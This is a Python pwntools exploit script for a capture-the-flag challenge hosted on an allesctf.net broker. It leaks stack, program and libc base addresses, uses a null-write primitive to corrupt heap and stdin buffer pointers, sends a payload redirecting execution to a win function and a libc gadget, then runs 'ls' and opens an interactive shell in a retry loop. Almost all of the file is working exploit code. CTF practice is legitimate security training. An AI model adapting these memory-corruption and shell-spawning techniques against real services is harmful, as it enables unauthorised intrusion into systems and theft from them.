from __future__ import division, print_function
import random
from pwn import *
import argparse
import time
import socket,ssl



context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu

def main(r):

    def wait_for_attach():
        if not is_gaibu:
            print('attach?')
            raw_input()

    def just_u64(x):
        return u64(x.ljust(8, '\x00'))


    def recvuntil(x, verbose=True):
        s = r.recvuntil(x)
        if log and verbose:
            print(s)
        return s.strip(x)

    def recv(verbose=True):
        s = r.recv()
        if log and verbose:
            print(s)
        return s

    def recvline(verbose=True):
        s = r.recvline()
        if log and verbose:
            print(s)
        return s.strip('\n')

    def sendline(s, verbose=True):
        if log and verbose:
            pass
            #print(s)
        r.sendline(s)

    def send(s, verbose=True):
        if log and verbose:
            print(s, end='')
        r.send(s)

    def interactive():
        r.interactive()

    ####################################

    def menu(choice):
        recvuntil('>')
        sendline(str(choice))

    # receive and send
    def rs(s, new_line=True, r=':'):
        recvuntil(r)
        s = str(s)
        if new_line:
            sendline(s)
        else:
            send(s)


    def view(addr=None):
        menu(1)
        recvuntil('address>')
        if addr is None:
            sendline('+')
        else:
            sendline(str(addr))

        recvline()
        l = recvline().split(':')
        pos = int(l[0], 16)
        val = int(l[1].strip(' '), 16)
        return (pos, val)


    def null(addr):
        menu(2)
        recvuntil('address>')
        sendline(str(addr))


    stack_base, val = view()
    stack_base -= 0xf0
    print(hex(stack_base))
    _, prog_base = view(stack_base - 0x18)
    prog_base -= 0x1273
    print(hex(prog_base))
    _, libc_base = view(prog_base + 0x4060)
    libc_base -= 0x1eb6a0
    print(hex(libc_base))

    _, ld_ptr = view(prog_base + 0x4010)
    print(hex(ld_ptr))


    null(0x400a+ prog_base)
    # topchunk
    top_chunk_addr = libc_base + 0x1eabdb
    null(top_chunk_addr)

    # buf_base
    buf_base_addr =libc_base + 0x1ea9b8
    #null(buf_base_addr+4)
    wait_for_attach()
    null(buf_base_addr)
    #recvuntil('>')
    #wait_for_attach()
    #sendline('1234567')

    get_me_out_of_this_mess = 0x1199 + prog_base
    sendline(p64(get_me_out_of_this_mess) * 6 + p64(libc_base + 0xe63a0) + p64(get_me_out_of_this_mess))

    # nyuryoku

    # got overwrite

    # get_me_out_of_this_mess
    sendline("ls")
    s = recvline()

    #interactive()
for i in range(1000000):
    if is_gaibu:
        host = "7b0000000158d462b15a9bee.challenges.broker3.allesctf.net"
        port = 1337
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        context.verify_mode = ssl.CERT_REQUIRED
        context.check_hostname = True
        context.load_default_certs()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = context.wrap_socket(s, server_hostname=host)
        ssl_sock.connect((host, port))
        r = remote.fromsocket(ssl_sock)
    else:
        host = args.host
        port = args.port
        r = remote(host, port)
    print(i)
    try:
        main(r)
        r.interactive()
    except KeyboardInterrupt:
        break
    except:
        print('err')
    try:
        r.close()
    except KeyboardInterrupt:
        break
    except:
        pass


